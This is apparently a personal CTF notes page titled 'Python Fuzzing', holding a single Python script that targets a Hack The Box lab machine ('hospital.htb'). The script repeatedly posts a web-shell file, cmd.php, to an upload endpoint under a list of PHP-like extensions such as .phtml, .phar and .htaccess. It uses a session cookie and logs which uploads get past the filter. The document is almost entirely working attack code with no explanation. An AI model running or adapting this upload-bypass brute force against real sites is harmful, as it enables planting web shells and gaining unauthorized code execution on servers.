---
title: Python Fuzzing 
---

```python
#!/usr/bin/env python3

import requests
import pdb
import signal
import sys
import time

from termcolor import colored
from pwn import *

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

upload_url = "http://hospital.htb:8080/upload.php"
cookies = {'PHPSESSID': 'gh9lg4sdf903shtj55id5rbkfl'}
burp = {'http': 'http://127.0.0.1:8080'}
extensions = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]

def fileUpload():

    f = open("cmd.php", "r")
    fileContent = f.read()

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    for extension in extensions:
        p1.status(f"Probando con la extensión {extension}")
        fileToUpload = {'image': (f"cmd{extension}", fileContent.strip())}

        r = requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)

        if "failed" not in r.headers["Location"]:
            log.info(f"Extensión {extension}: {r.headers['Location']}")

        time.sleep(1)

if __name__ == '__main__':

    fileUpload()
```

